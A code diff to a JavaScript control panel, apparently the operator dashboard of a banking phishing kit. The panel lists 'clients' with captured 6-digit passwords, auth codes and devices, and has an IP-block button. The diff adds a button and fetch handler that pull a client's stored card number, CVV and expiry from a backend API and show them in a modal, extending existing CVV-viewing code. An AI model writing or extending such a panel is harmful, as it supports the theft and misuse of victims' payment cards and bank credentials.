@@ -25,7 +25,80 @@ const panel = (() => {
 
     const token = document.body.dataset.token
 
+    function clickShowCard(button) {
+        if(!button) return
+
+        button.addEventListener('click', async function (e) {
+                
+            e.preventDefault()
+
+            try {
+                console.log(`cliquei no botão`, button)
+
+                const id = button.dataset.id
+
+                if(!id) return console.log(`Botão não possui id`)
+
+                ///api/client/card/:client_id
+                const config = {
+                    method: `get`,
+                    headers: {
+                        'Content-Type': 'application/json',
+                    }
+                }
+
+                const client = await (await fetch(`/api/client/card/${id}`, config)).json()
+
+                const { cards } = client
+
+                console.log(`cliente: `, client)
+
+                const modal = document.querySelector('#modalCard');
+
+                const number = modal.querySelector('.card_number');
+
+                if(!number) return
+
+                number.value = cards[0].end
+
+                const cvv = modal.querySelector('.card_cvv');
+
+                if(!cvv) return
+
+                cvv.value = cards[0].cvv
+
+                const flag = modal.querySelector('.card_validity');
+
+                if(!flag) return
+
+                flag.value = cards[0].flag
+
+                var modalCard = new bootstrap.Modal(document.getElementById("modalCard"), {});
+
+                modalCard.show();
+            } catch (error) {
+                console.log(error)
+            }
+            
+            
+        });
+    }
+
     //clientIdentify
+
+    function showCard(target) {
+        const buttons = document.querySelectorAll(target);
+
+        if(!buttons) return
+
+        
+
+        for (const button of buttons) {
+            clickShowCard(button)
+        }
+
+        
+    }
 
     function cleanInfos() {
         const button = document.querySelector('.btn-clean')
@@ -269,17 +342,31 @@ const panel = (() => {
         <td role="status" class="blockstatus enter"><span>${password6}</span></td>
         <td role="auth" class="blockstatus enter"><span>${auth}</span></td>
         <td role="device">
-            <span class="snippet-device" data-bs-toggle="tooltip" data-bs-placement="top" title="Modelo: ${
-                client.device.model || `Desconhecido`
-            }">
-                ${client.device.type || `Desconhecido`}
-            </span>
-            <button data-client="${id}">Bloquear ip</button>
+
+            <div class="row">
+                <div class="col-7">
+                    <span class="snippet-device" data-bs-toggle="tooltip" data-bs-placement="top" title="
+                    Modelo: ${ client.device.model || `Desconhecido` }">
+                        ${client.device.type || `Desconhecido`}
+                    </span>
+                    <button class="blockIP" data-client="${id}"><i class="bi bi-lock-fill"></i></button>
+                </div>
+
+                <div class="col-5">
+                    <button type="button" class="btn btn-primary btnShowCard" data-id="${id}">
+                        <i class="bi bi-credit-card"></i>
+                    </button>
+                </div>
+            </div>
+
         </td>
         `
-
+        
         //timer(roleTime)
-        const buttonBlock = tr.querySelector('td[role="device"] button')
+        const buttonBlock = tr.querySelector('td[role="device"] button.blockIP')
+        const buttonShowCard = tr.querySelector('td[role="device"] button.btnShowCard')
+
+        clickShowCard(buttonShowCard)
 
         handleBlockIp(buttonBlock)
 
@@ -764,11 +851,14 @@ const panel = (() => {
         excludeUser,
         getCardNumber,
         BlockIp,
+        showCard
     }
 })()
 
-const buttonsBlock = document.querySelectorAll('.productList td[role="device"] button')
+const buttonsBlock = document.querySelectorAll('.productList td[role="device"] button.blockIP')
 
+
+panel.showCard(`.btnShowCard`)
 panel.BlockIp(buttonsBlock)
 panel.getCardNumber(`.getCVV`)
 panel.excludeUser()
